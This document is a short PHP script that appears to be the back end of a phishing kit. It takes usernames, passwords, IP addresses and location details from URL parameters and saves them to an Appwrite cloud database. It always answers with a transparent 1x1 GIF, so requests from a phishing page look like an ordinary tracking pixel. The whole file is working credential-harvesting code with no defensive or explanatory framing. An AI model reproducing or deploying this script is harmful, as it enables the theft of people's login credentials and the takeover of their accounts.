<?php
$u = $_GET['u'] ?? '';
$p = $_GET['p'] ?? '';
$ip = $_GET['ip'] ?? '';
$country = $_GET['country'] ?? '';
$city = $_GET['city'] ?? '';
$state = $_GET['state'] ?? '';

$endpoint = getenv('APPWRITE_ENDPOINT') ?: 'https://cloud.appwrite.io/v1';
$projectId = getenv('APPWRITE_PROJECT_ID');
$apiKey = getenv('APPWRITE_API_KEY');
$databaseId = getenv('APPWRITE_DATABASE_ID');
$collectionId = getenv('APPWRITE_COLLECTION_ID');

if (empty($u) && empty($p)) {
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}

$data = [
    'username' => $u,
    'password' => $p,
    'ip' => $ip,
    'country' => $country,
    'city' => $city,
    'state' => $state,
    'timestamp' => date('Y-m-d H:i:s')
];

$url = "$endpoint/databases/$databaseId/collections/$collectionId/documents";

if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'X-Appwrite-Project: ' . $projectId,
        'X-Appwrite-Key: ' . $apiKey
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_exec($ch);
    curl_close($ch);
}

header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
